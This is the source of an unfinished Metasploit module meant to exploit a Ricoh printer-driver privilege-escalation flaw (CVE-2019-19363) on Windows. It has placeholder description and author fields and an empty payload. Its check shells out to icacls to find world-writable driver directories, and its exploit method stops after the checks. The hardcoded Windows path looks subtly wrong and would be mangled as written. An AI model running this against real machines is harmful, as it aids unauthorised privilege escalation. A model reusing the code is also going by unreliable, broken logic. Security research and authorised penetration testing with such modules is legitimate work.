##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Ricoh Driver Privilege Escalation',
        'Description'    => %q(
          placeholder description
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
                              'placeholder',  # discovery & poc
                              'Shelby Pace'   # msf module
                            ],
        'References'     =>
          [
            [ 'CVE', '2019-19363'],
            [ 'URL', 'https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/']
          ],
        'Payload'        => { },
        'Targets'        =>
          [
            [
              'Windows',
              {
              }
            ]
          ],
        'DisclosureDate' => "Jan 22 2020",
        'DefaultTarget'  => 0
    ))

    register_advanced_options([
      OptBool.new('ForceExploit', [ false, 'Override check result', false ])
    ])
  end

  def check
    dir_name = "C:\Windows\ProgramData\RICOH_DRV"

    return CheckCode::Safe('No Ricoh driver found') unless dir(dir_name)

    res = cmd_exec("icacls \"#{dir_name}\"")
    return CheckCode::Detected("Detected Ricoh driver directory") unless res.include?('Everyone:')
    res = res.split('Everyone:')[1]

    return CheckCode::Detected('Ricoh driver directory does not have full permissions') unless res.match(/\(F\)/)

    CheckCode::Appears('Ricoh driver directory has full permissions')
  end

  def exploit
    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?

    unless check == CheckCode::Appears || datastore['ForceExploit']
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override')
    end
  end
end
